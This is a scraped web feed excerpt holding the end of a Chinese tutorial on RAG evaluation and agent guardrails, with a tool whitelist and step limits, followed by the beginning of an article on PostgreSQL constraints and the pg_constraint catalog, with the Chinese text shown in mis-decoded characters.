<h3 data-id="heading-6">4.1 RAG çœŸçš„â€œéš¾â€åœ¨å“ªï¼šä¸æ˜¯ç”Ÿæˆï¼Œæ˜¯æ£€ç´¢</h3>
<p>RAG çš„æ­£ç¡®æ‰“å¼€æ–¹å¼æ˜¯ä¸¤å±‚è¯„æµ‹ï¼š</p>
<ol>
<li><strong>å…ˆè¯„æ£€ç´¢</strong>ï¼šTop-k é‡Œèƒ½ä¸èƒ½å‘½ä¸­æ­£ç¡®æ®µè½ï¼ˆå‘½ä¸­ç‡/å¬å›ç‡ï¼‰</li>
<li><strong>å†è¯„ç”Ÿæˆ</strong>ï¼šç­”æ¡ˆæ˜¯å¦â€œåªåŸºäºèµ„æ–™â€ï¼Œå¼•ç”¨æ˜¯å¦æ­£ç¡®</li>
</ol>
<p>å¦åˆ™ä½ ä¼šå‡ºç°ä¸€ç§å…¸å‹é”™è§‰ï¼šæ¨¡å‹å¾ˆå¼ºï¼Œä½†â€œç­”éæ‰€é—®â€ã€‚å…¶å®æ˜¯æ£€ç´¢æ²¡å‘½ä¸­ï¼Œæ¨¡å‹åªèƒ½çç¼–ã€‚</p>
<h3 data-id="heading-7">4.2 å…ˆæŠŠå‘é‡åº“æŠ½è±¡æˆæ¥å£ï¼ˆæ–¹ä¾¿æ›¿æ¢ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">VectorStore</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">self, query: <span class="hljs-built_in">str</span>, k: <span class="hljs-built_in">int</span> = <span class="hljs-number">5</span></span>) -&gt; <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>]:
        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> è¿”å›æœ€ç›¸å…³çš„chunkæ–‡æœ¬ï¼ˆæˆ–å¸¦sourceä¿¡æ¯ï¼‰</span>
        <span class="hljs-keyword">return</span> []

store = VectorStore()

<span class="hljs-keyword">def</span> <span class="hljs-title function_">retrieve</span>(<span class="hljs-params">query: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>]:
    <span class="hljs-keyword">return</span> store.search(query, k=<span class="hljs-number">5</span>)
</code></pre>
<h3 data-id="heading-8">4.3 ä¸€ä¸ªæ›´â€œç”Ÿäº§å‹å¥½â€çš„ RAG æç¤ºè¯ï¼ˆé¿å…èµ„æ–™ä¸è¶³ä¹Ÿç¡¬ç­”ï¼‰</h3>
<pre><code class="hljs language-text" lang="text">ä½ æ˜¯ä¼ä¸šçŸ¥è¯†åŠ©æ‰‹ã€‚
è§„åˆ™ï¼š
1) åªå…è®¸åŸºäº&lt;èµ„æ–™&gt;å›ç­”ï¼›
2) å¦‚æœèµ„æ–™ä¸è¶³ä»¥æ”¯æŒç»“è®ºï¼Œè¯·å›ç­”â€œèµ„æ–™ä¸è¶³â€ï¼Œå¹¶è¯´æ˜è¿˜ç¼ºå“ªç±»èµ„æ–™ï¼›
3) å›ç­”æœ«å°¾åˆ—å‡ºå¼•ç”¨çš„èµ„æ–™ç‰‡æ®µåºå·ï¼ˆå¦‚[1][2]ï¼‰ã€‚
</code></pre>
<hr/>
<h2 data-id="heading-9">5ï¼‰Agentï¼šæœ€å°å¾ªç¯ï¼ˆå…ˆæŠŠâ€œåœæ­¢æ¡ä»¶â€å†™æ¸…æ¥šï¼‰</h2>
<p>Agent çš„æœ¬è´¨ï¼š<strong>LLM è´Ÿè´£è§„åˆ’ï¼Œå·¥å…·è´Ÿè´£æ‰§è¡Œ</strong>ã€‚<br/>
ä½ ä¸€å®šè¦å†™æ¸…æ¥š 3 ä¸ªâ€œæŠ¤æ â€ï¼šæœ€å¤§æ­¥æ•°ã€è¶…æ—¶ã€å…³é”®åŠ¨ä½œç¡®è®¤ã€‚</p>
<pre><code class="hljs language-python" lang="python">MAX_STEPS = <span class="hljs-number">6</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">tool_search_kb</span>(<span class="hljs-params">q: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-keyword">return</span> <span class="hljs-string">"..."</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">tool_create_ticket</span>(<span class="hljs-params">title: <span class="hljs-built_in">str</span>, detail: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-keyword">return</span> <span class="hljs-string">"ticket_id=..."</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">run_agent</span>(<span class="hljs-params">task: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-comment"># è¿™é‡Œåªç»™â€œå·¥ç¨‹éª¨æ¶â€ï¼Œå…·ä½“å·¥å…·è°ƒç”¨æ ¼å¼æŒ‰ä½ ä½¿ç”¨çš„å¹³å°/SDK ä¸ºå‡†</span>
    messages = [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: task}]
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(MAX_STEPS):
        <span class="hljs-comment"># 1) è®©æ¨¡å‹è¾“å‡ºä¸‹ä¸€æ­¥è®¡åˆ’ï¼ˆæˆ–å·¥å…·è°ƒç”¨ï¼‰</span>
        <span class="hljs-comment"># 2) æ‰§è¡Œå·¥å…·</span>
        <span class="hljs-comment"># 3) æŠŠç»“æœå†™å› messages</span>
        <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"stopped"</span>
</code></pre>
<h3 data-id="heading-10">5.1 Agent æŠ¤æ æ¸…å•ï¼ˆå†™è¿›ä»£ç ï¼Œä¸è¦åªå†™åœ¨æ–‡æ¡£é‡Œï¼‰</h3>
<ul>
<li><strong>MAX_STEPS</strong>ï¼šé˜²å¾ªç¯</li>
<li><strong>è¶…æ—¶</strong>ï¼šé˜²å¡æ­»ï¼ˆå°¤å…¶æ˜¯å·¥å…·å“åº”æ…¢ï¼‰</li>
<li><strong>å…³é”®åŠ¨ä½œç¡®è®¤</strong>ï¼šæ¯”å¦‚â€œå‘é€šçŸ¥/æ”¹çŠ¶æ€/ç”Ÿæˆè®¢å•â€å¿…é¡»äºŒæ¬¡ç¡®è®¤</li>
<li><strong>æœ€å°æƒé™</strong>ï¼šå·¥å…·åªæš´éœ²å¿…è¦å‚æ•°ï¼Œé¿å…è¶Šæƒ</li>
<li><strong>å®¡è®¡æ—¥å¿—</strong>ï¼šæ¯æ­¥è¾“å…¥è¾“å‡ºã€å·¥å…·åã€å‚æ•°ã€ç»“æœã€è€—æ—¶</li>
</ul>
<h3 data-id="heading-11">5.2 ç”¨â€œå·¥å…·ç™½åå•â€é™åˆ¶æ¨¡å‹ä¹±è°ƒç”¨</h3>
<pre><code class="hljs language-python" lang="python">ALLOWED_TOOLS = {<span class="hljs-string">"search_kb"</span>, <span class="hljs-string">"create_ticket"</span>}

tools = {
    <span class="hljs-string">"search_kb"</span>: tool_search_kb,
    <span class="hljs-string">"create_ticket"</span>: tool_create_ticket,
}

<span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_call_tool</span>(<span class="hljs-params">name: <span class="hljs-built_in">str</span>, *args, **kwargs</span>):
    <span class="hljs-keyword">if</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ALLOWED_TOOLS:
        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f"tool not allowed: <span class="hljs-subst">{name}</span>"</span>)
    <span class="hljs-keyword">return</span> tools[name](*args, **kwargs)
</code></pre>
<hr/>
<h2 data-id="heading-12">6ï¼‰ä¸‹ä¸€ç¯‡ä½ æƒ³çœ‹å“ªä¸ªï¼Ÿ</h2>
<ol>
<li>RAG çš„ 10 ä¸ªç¿»è½¦ç‚¹ï¼ˆå«åˆ†å—/æ£€ç´¢/é‡æ’/è¯„æµ‹æ¸…å•ï¼‰</li>
<li>æŠŠè°ƒç”¨åšæˆå¯ä¸Šçº¿ï¼šè¶…æ—¶/é‡è¯•/é™æµ/æ—¥å¿—æ€ä¹ˆåš</li>
<li>å¤šæ¨¡å‹å¯¹æ¯”è¯„æµ‹è¡¨ï¼šä¸€å‘¨æŠŠâ€œè¯¥é€‰å“ªä¸ªæ¨¡å‹â€è¯´æ¸…æ¥š</li>
</ol>
<hr/>
<h2 data-id="heading-13">å£°æ˜</h2>
<p>æœ¬æ–‡ä»¥æŠ€æœ¯åˆ†äº«ä¸ºä¸»ï¼›ç¤ºä¾‹å‚æ•°ä»¥å¯¹åº”æ–‡æ¡£ä¸æ§åˆ¶å°ä¸ºå‡†ï¼Œä¸æ„æˆè´­ä¹°å»ºè®®ã€‚<br/>
147ai ä»…ä½œä¸ºç¤ºä¾‹å…¥å£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2F147ai.com%2F%3Futm_source%3Djuejin%26utm_medium%3Dcontent%26utm_campaign%3Dllm_daily%26utm_content%3Dday00_getting-started" target="_blank" title="https://147ai.com/?utm_source=juejin&amp;utm_medium=content&amp;utm_campaign=llm_daily&amp;utm_content=day00_getting-started" ref="nofollow noopener noreferrer">147ai å®˜ç½‘</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¤–é”®çš„æœ¬è´¨ç«Ÿç„¶æ˜¯è§¦å‘å™¨ï¼Ÿæ·±å…¥è§£æ PostgreSQL çº¦æŸåº•å±‚]]></title>    <link>https://juejin.cn/post/7589082912587382827</link>    <guid>https://juejin.cn/post/7589082912587382827</guid>    <pubDate>2025-12-29T08:20:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589082912587382827" data-draft-id="7588704463621767187" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¤–é”®çš„æœ¬è´¨ç«Ÿç„¶æ˜¯è§¦å‘å™¨ï¼Ÿæ·±å…¥è§£æ PostgreSQL çº¦æŸåº•å±‚"/> <meta itemprop="keywords" content="æ•°æ®åº“,PostgreSQL,å¼€æº"/> <meta itemprop="datePublished" content="2025-12-29T08:20:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IvorySQL"/> <meta itemprop="url" content="https://juejin.cn/user/761327331579511"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¤–é”®çš„æœ¬è´¨ç«Ÿç„¶æ˜¯è§¦å‘å™¨ï¼Ÿæ·±å…¥è§£æ PostgreSQL çº¦æŸåº•å±‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/761327331579511/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IvorySQL
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T08:20:12.000Z" title="Mon Dec 29 2025 08:20:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä»€ä¹ˆæ˜¯çº¦æŸ</h2>
<p>åœ¨å®šä¹‰è¡¨æˆ–åˆ—æ—¶ï¼Œå¯ä»¥ä¸ºæ•°æ®é™„åŠ æ ¡éªŒæˆ–å¼ºåˆ¶è§„åˆ™çš„ï¼Œè¿™äº›è§„åˆ™ç§°ä¸ºçº¦æŸã€‚</p>
<p>æ•°æ®ç±»å‹æœ¬èº«åªèƒ½æä¾›è¾ƒç²—ç²’åº¦çš„é™åˆ¶ï¼Œä¾‹å¦‚ numeric æ— æ³•é™å®šåªèƒ½ä¸ºæ­£æ•°ã€‚æ›´å…·ä½“çš„è§„åˆ™ï¼ˆå¦‚å”¯ä¸€æ€§ã€å–å€¼èŒƒå›´ç­‰ï¼‰éœ€è¦é€šè¿‡çº¦æŸæ¥å®ç°ã€‚</p>
<p>çº¦æŸç”¨äºä¿éšœæ•°æ®å®Œæ•´æ€§ã€‚å½“æ’å…¥æˆ–é»˜è®¤å€¼è¿åçº¦æŸæ—¶ï¼ŒPostgreSQL ä¼šç›´æ¥æŠ¥é”™ã€‚</p>
<p>æœ¬è´¨ä¸Šï¼Œçº¦æŸæ˜¯æ•°æ®åº“å±‚é¢å¼ºåˆ¶æ‰§è¡Œçš„æ•°æ®è§„åˆ™ã€‚ä¸€æ—¦ç¼ºå¤±æˆ–ä½¿ç”¨ä¸å½“ï¼Œæ•°æ®é—®é¢˜å¾€å¾€ä¼šæ‚„ç„¶ç§¯ç´¯ï¼Œå¹¶æœ€ç»ˆæ¼”å˜ä¸ºéš¾ä»¥æ’æŸ¥çš„ç¼ºé™·ã€‚</p>
<h2 data-id="heading-1">pg_constraint ç³»ç»Ÿç›®å½•</h2>
<p>ä»å†…éƒ¨å®ç°æ¥çœ‹ï¼ŒPostgreSQL ä¸­çš„æ‰€æœ‰çº¦æŸï¼Œéƒ½ä¼šä»¥è®°å½•çš„å½¢å¼å­˜å‚¨åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.postgresql.org%2Fdocs%2Fcurrent%2Fcatalog-pg-constraint.html" target="_blank" title="https://www.postgresql.org/docs/current/catalog-pg-constraint.html" ref="nofollow noopener noreferrer">pg_constraint</a> ç³»ç»Ÿç›®å½•ä¸­ã€‚</p>
<blockquote>
<p>ğŸ—„ï¸ ä»€ä¹ˆæ˜¯ç³»ç»Ÿç›®å½•ï¼ˆCatalogï¼‰</p>
<p>ç³»ç»Ÿç›®å½•æ˜¯ PostgreSQL ç”¨æ¥ä¿å­˜å…ƒæ•°æ®çš„ç³»ç»Ÿè¡¨ã€‚ç”¨æˆ·è¡¨å­˜å‚¨ä¸šåŠ¡æ•°æ®ï¼Œè€Œç³»ç»Ÿç›®å½•åˆ™è®°å½•â€œæ•°æ®åº“è‡ªèº«çš„ä¿¡æ¯â€ï¼Œä¾‹å¦‚è¡¨ã€åˆ—ã€ç´¢å¼•ã€çº¦æŸç­‰ã€‚</p>
<p>é™¤ <code>pg_constraint</code> ä¹‹å¤–ï¼Œå¸¸è§çš„ç³»ç»Ÿç›®å½•è¿˜åŒ…æ‹¬ï¼š</p>
<ul>
<li><code>pg_class</code>ï¼šæ‰€æœ‰å…³ç³»å¯¹è±¡ï¼ˆè¡¨ã€ç´¢å¼•ã€è§†å›¾ç­‰ï¼‰</li>
<li><code>pg_attribute</code>ï¼šè¡¨çš„åˆ—ä¿¡æ¯</li>
<li><code>pg_type</code>ï¼šæ•°æ®ç±»å‹ï¼ˆå«åŸŸå’Œè‡ªå®šä¹‰ç±»å‹ï¼‰</li>
<li><code>pg_namespace</code>ï¼šæ¨¡å¼ï¼ˆschemaï¼‰</li>
<li><code>pg_index</code>ï¼šç´¢å¼•ç›¸å…³ä¿¡æ¯ï¼ˆå…¶ä½™ä¿¡æ¯ä¸»è¦åœ¨ <code>pg_class</code> ä¸­ï¼‰</li>
<li><code>pg_proc</code>ï¼šå‡½æ•°ã€è¿‡ç¨‹åŠèšåˆå‡½æ•°</li>
</ul>
<p>è¿™äº›è¡¨éƒ½ä½äº <code>pg_catalog</code> æ¨¡å¼ä¸­ï¼Œè¯¥æ¨¡å¼åœ¨ <code>search_path</code> ä¸­é»˜è®¤ä¼˜å…ˆï¼Œå› æ­¤é€šå¸¸æ— éœ€æ˜¾å¼æŒ‡å®šã€‚</p>
</blockquote>
<blockquote>
<p><code>pg_constraint</code> ç”¨äºå­˜å‚¨è¡¨ä¸Šçš„ CHECKã€NOT NULLã€ä¸»é”®ã€å”¯ä¸€ã€å¤–é”®å’Œæ’ä»–çº¦æŸã€‚</p>
</blockquote>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ PostgreSQL 18 ä¹‹å‰ï¼Œè¡¨ä¸Šçš„ NOT NULL çº¦æŸå¹¶ä¸å­˜å‚¨åœ¨ pg_constraint ä¸­ï¼Œè€Œæ˜¯è®°å½•åœ¨ <code>pg_attribute</code>ï¼›ä» PostgreSQL 18 å¼€å§‹ï¼ŒNOT NULL æ‰åœ¨ <code>pg_constraint</code> ä¸­æ‹¥æœ‰ç‹¬ç«‹è®°å½•ã€‚</p>
<blockquote>
<p>PostgreSQL 17ï¼š</p>
<p><code>pg_constraint</code> ç›®å½•ç”¨äºå­˜å‚¨ CHECKã€ä¸»é”®ã€å”¯ä¸€ã€å¤–é”®ã€æ’ä»–çº¦æŸï¼Œä»¥åŠå®šä¹‰åœ¨åŸŸä¸Šçš„ NOT NULL çº¦æŸã€‚</p>
<p>è¡¨ä¸Šçš„ NOT NULL çº¦æŸä»ç„¶è®°å½•åœ¨ <code>pg_attribute</code> ä¸­ï¼Œè€Œé <code>pg_constraint</code>ã€‚</p>
</blockquote>
<p>å› æ­¤ï¼Œæ¯ä¸€ä¸ªçº¦æŸéƒ½ä¼šåœ¨ <code>pg_constraint</code> ä¸­ä»¥ä¸€æ¡è®°å½•å­˜åœ¨ï¼Œå¹¶é€šè¿‡ <code>contype</code> å­—æ®µæ ‡è¯†çº¦æŸç±»å‹ã€‚åæ–‡å°†å¯¹è¿™äº›ç±»å‹é€ä¸€è¯´æ˜ï¼Œå…¶ä¸­ä¹ŸåŒ…æ‹¬ä¸€ä¸ªè¾ƒä¸ºç‰¹æ®Šçš„ç±»å‹ï¼š<code>t</code>ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ebbca1f2b754b948de421770f41a6d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZvcnlTUUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767601212&amp;x-signature=SmAPaA0KXlQtJUDX%2BtYiZRC8wss%3D" alt="1.png" loading="lazy"/></p>
<h2 data-id="heading-2">åˆ—çº¦æŸä¸è¡¨çº¦æŸ</h2>
<p><code>pg_constraint</code> æ–‡æ¡£ä¸­æ˜ç¡®æŒ‡å‡ºï¼š</p>
<blockquote>
<p>åˆ—çº¦æŸä¸ä¼šè¢«ç‰¹æ®Šå¤„ç†ï¼Œæ¯ä¸ªåˆ—çº¦æŸåœ¨å†…éƒ¨éƒ½ç­‰ä»·äºæŸç§è¡¨çº¦æŸã€‚</p>
</blockquote>
<p>SQL å±‚é¢ä¸Šï¼Œçº¦æŸå¯ä»¥å†™åœ¨åˆ—å®šä¹‰åï¼Œä¹Ÿå¯ä»¥å†™æˆè¡¨çº¦æŸï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> products_oct (
  price <span class="hljs-type">numeric</span> <span class="hljs-keyword">CHECK</span> (price <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span>)
);

<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> products_nov (
  price <span class="hljs-type">numeric</span>,
  <span class="hljs-keyword">CHECK</span> (price <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span>)
);
</code></pre>
<p>ç¬¬ä¸€ç§å†™æ³•åªä½œç”¨äºå•åˆ—ï¼Œç¬¬äºŒç§å†™æ³•å¯ä»¥ä½œç”¨äºå¤šåˆ—ã€‚ä½†åœ¨ PostgreSQL å†…éƒ¨ï¼Œè¿™ä¸¤ç§æ–¹å¼æœ€ç»ˆéƒ½ä¼šè¢«ç»Ÿä¸€è®°å½•ä¸º <code>pg_constraint</code> ä¸­çš„ä¸€è¡Œæ•°æ®ã€‚</p>
<p>å› æ­¤ï¼Œæ— è®ºçº¦æŸä»¥å“ªç§å½¢å¼å®šä¹‰ï¼Œéƒ½å¯ä»¥é€šè¿‡ <code>ALTER TABLE .. DROP CONSTRAINT ..</code> åˆ é™¤ã€‚ç³»ç»Ÿç›®å½•ä¸­å¹¶ä¸å­˜åœ¨â€œåˆ—çº¦æŸâ€çš„ç‰¹æ®Šæ ‡è¯†ï¼Œå®ƒåªæ˜¯ä½œç”¨äºå•åˆ—çš„è¡¨çº¦æŸã€‚</p>
<p>ä¸‹é¢çš„æŸ¥è¯¢ç”¨äºæŸ¥çœ‹ä¸¤ä¸ªç¤ºä¾‹è¡¨ä¸­çš„çº¦æŸå®šä¹‰ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">SELECT</span>
  rel.relname <span class="hljs-keyword">AS</span> table_name,
  c.conname,
  c.contype,
  c.conrelid::regclass <span class="hljs-keyword">AS</span> table_ref,
  c.conkey,
  pg_get_constraintdef(c.oid, <span class="hljs-literal">true</span>) <span class="hljs-keyword">AS</span> constraint_def
<span class="hljs-keyword">FROM</span> pg_constraint c
<span class="hljs-keyword">JOIN</span> pg_class rel <span class="hljs-keyword">ON</span> rel.oid = c.conrelid
<span class="hljs-keyword">WHERE</span> rel.relname <span class="hljs-keyword">IN</span> (<span class="hljs-comment">'products_oct', 'products_nov');</span>
</code></pre>
<blockquote>
<p>âš¡ æŸ¥è¯¢è¦ç‚¹è¯´æ˜</p>
<ul>
<li><code>pg_class</code> ç”¨äºå­˜å‚¨æ‰€æœ‰å…³ç³»å¯¹è±¡çš„å…ƒæ•°æ®ã€‚</li>
<li><code>relname</code> ä¸ºè¡¨çš„åç§°ï¼Œç”±äº <code>pg_constraint</code> ä¸­ä»…ä¿å­˜è¡¨çš„ OIDï¼Œéœ€è¦é€šè¿‡ <code>rel.oid = c.conrelid</code> è¿›è¡Œå…³è”ã€‚</li>
<li><code>conrelid</code> è¡¨ç¤ºçº¦æŸæ‰€å±è¡¨çš„ OIDã€‚</li>
<li><code>conname</code> ä¸ºçº¦æŸåç§°ï¼Œçº¦æŸåç§°åœ¨å•è¡¨å†…å”¯ä¸€ï¼Œå¯ç”±ç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆï¼Œä¹Ÿå¯åœ¨ DDL ä¸­æ˜¾å¼æŒ‡å®šã€‚</li>
<li><code>contype</code> è¡¨ç¤ºçº¦æŸç±»å‹ï¼ˆ<code>c</code>ã€<code>f</code>ã€<code>n</code>ã€<code>p</code>ã€<code>u</code>ã€<code>x</code>ã€<code>t</code>ï¼‰ã€‚</li>
<li><code>conkey</code> ä¸ºå±æ€§ç¼–å·æ•°ç»„ï¼Œç”¨äºæ ‡è¯†çº¦æŸæ¶‰åŠçš„åˆ—ï¼ˆå¦‚ <code>{1}</code> è¡¨ç¤ºç¬¬ä¸€åˆ—ï¼Œ<code>{1,3}</code> è¡¨ç¤ºç¬¬ä¸€å’Œç¬¬ä¸‰åˆ—ï¼‰ã€‚</li>
<li><code>pg_get_constraintdef()</code> ä¸ºç³»ç»Ÿå‡½æ•°ï¼Œç”¨äºè·å–çº¦æŸå®šä¹‰æ–‡æœ¬ã€‚</li>
</ul>
</blockquote>
<p>æŸ¥è¯¢ç»“æœå¦‚ä¸‹æ‰€ç¤ºã€‚ä¸¤ç§çº¦æŸåœ¨å†…éƒ¨è¡¨ç¤ºä¸Šå‡ ä¹å®Œå…¨ä¸€è‡´ï¼Œä»…çº¦æŸåç§°å’Œæ‰€å±è¡¨ä¸åŒã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-operator">-</span>[ RECORD <span class="hljs-number">1</span> ]<span class="hljs-comment">--+---------------------------</span>
table_name     <span class="hljs-operator">|</span> products_nov
conname        <span class="hljs-operator">|</span> products_nov_price_check
contype        <span class="hljs-operator">|</span> c
table_ref      <span class="hljs-operator">|</span> products_nov
conkey         <span class="hljs-operator">|</span> {<span class="hljs-number">1</span>}
